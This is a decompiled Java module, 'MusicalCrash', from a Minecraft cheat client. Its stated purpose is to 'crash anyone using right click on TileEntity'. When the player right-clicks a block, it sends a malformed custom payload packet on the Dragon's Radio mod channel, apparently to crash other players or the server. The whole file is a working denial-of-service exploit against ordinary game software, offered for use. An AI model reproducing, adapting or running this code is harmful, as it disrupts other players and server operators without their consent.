/*
 * Decompiled with CFR 0_128.
 * 
 * Could not load the following classes:
 *  net.minecraft.block.material.Material
 *  net.minecraft.client.Minecraft
 *  net.minecraft.client.entity.EntityClientPlayerMP
 *  net.minecraft.client.multiplayer.PlayerControllerMP
 *  net.minecraft.client.multiplayer.WorldClient
 *  net.minecraft.entity.Entity
 *  net.minecraft.entity.EntityLivingBase
 *  net.minecraft.entity.player.EntityPlayer
 *  net.minecraft.item.Item
 *  net.minecraft.item.ItemStack
 *  net.minecraft.item.ItemSword
 *  net.minecraft.world.World
 */
package ehacks.mod.modulesystem.classes;

import cpw.mods.fml.client.registry.ClientRegistry;
import cpw.mods.fml.common.network.ByteBufUtils;
import java.util.List;
import net.minecraft.block.material.Material;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityClientPlayerMP;
import net.minecraft.client.multiplayer.PlayerControllerMP;
import net.minecraft.client.multiplayer.WorldClient;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EntityLivingBase;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.ItemSword;
import net.minecraft.world.World;
import ehacks.api.module.Module;
import ehacks.api.module.ModStatus;
import ehacks.mod.gui.EHacksClickGui;
import ehacks.mod.gui.window.WindowPlayerIds;
import ehacks.mod.modulesystem.classes.AimBot;
import ehacks.mod.modulesystem.classes.AutoBlock;
import ehacks.mod.modulesystem.classes.Criticals;
import ehacks.mod.wrapper.ModuleCategory;
import ehacks.mod.wrapper.Wrapper;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import java.lang.reflect.Method;
import java.util.logging.Level;
import java.util.logging.Logger;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.settings.KeyBinding;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.util.MovingObjectPosition;
import net.minecraftforge.client.event.MouseEvent;
import org.lwjgl.input.Mouse;
import net.minecraft.inventory.IInventory;
import org.lwjgl.input.Keyboard;

public class MusicalCrash
extends Module {
    
    public MusicalCrash() {
        super(ModuleCategory.EHACKS);
    }

    @Override
    public String getName() {
        return "MusicalCrash";
    }    
    
    @Override
    public String getDescription() {
        return "You can crash anyone using right click on TileEntity";
    }

    @Override
    public void onEnableMod() {
        try {
            Class.forName("eu.thesociety.DragonbornSR.DragonsRadioMod.Block.TileEntity.TileEntityRadio");
        }
        catch (Exception ex) {
            this.off();
            EHacksClickGui.log("[MusicalCrash] Not working");
        }
    }

    @Override
    public ModStatus getModStatus() {
        try {
            Class.forName("eu.thesociety.DragonbornSR.DragonsRadioMod.Block.TileEntity.TileEntityRadio");
            return ModStatus.WORKING;
        } catch (Exception e) {
            return ModStatus.NOTWORKING;
        }
    }
    
    @Override
    public void onDisableMod() {
        
    }
    
    private boolean prevState = false;
    
    @Override
    public void onMouse(MouseEvent event) {
        MovingObjectPosition mop = Wrapper.INSTANCE.mc().objectMouseOver;
        if (mop.sideHit == -1)
            return;
        boolean nowState = Mouse.isButtonDown(1);
        if (!prevState && nowState)
        {
            prevState = nowState;
            TileEntity entity = Wrapper.INSTANCE.world().getTileEntity(mop.blockX, mop.blockY, mop.blockZ);
            try {
                if (mop.typeOfHit == MovingObjectPosition.MovingObjectType.BLOCK && entity != null && !Class.forName("eu.thesociety.DragonbornSR.DragonsRadioMod.Block.TileEntity.TileEntityRadio").isInstance(entity))
                {
                    ByteBuf buf = Unpooled.buffer(0);
                    buf.writeByte(0);
                    buf.writeInt(0);
                    buf.writeDouble(mop.blockX);
                    buf.writeDouble(mop.blockY);
                    buf.writeDouble(mop.blockZ);
                    buf.writeInt(Wrapper.INSTANCE.player().dimension);
                    buf.writeInt(0);
                    buf.writeBytes(new byte[0]);
                    buf.writeBoolean(false);
                    buf.writeFloat(0);
                    buf.writeDouble(0);
                    buf.writeDouble(0);
                    buf.writeDouble(0); 
                    C17PacketCustomPayload packet = new C17PacketCustomPayload("DragonsRadioMod", buf);
                    Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(packet);
                    EHacksClickGui.log("[MusicalCrash] Crash sent");
                    if (event.isCancelable())
                        event.setCanceled(true);
                }
            } catch (Exception ex) {
                EHacksClickGui.log("[MusicalCrash] Error happened");
                ex.printStackTrace();
            }
        }
        prevState = nowState;
    }
    
    @Override
    public String getModName() {
        return "Dragon's radio";
    }
}

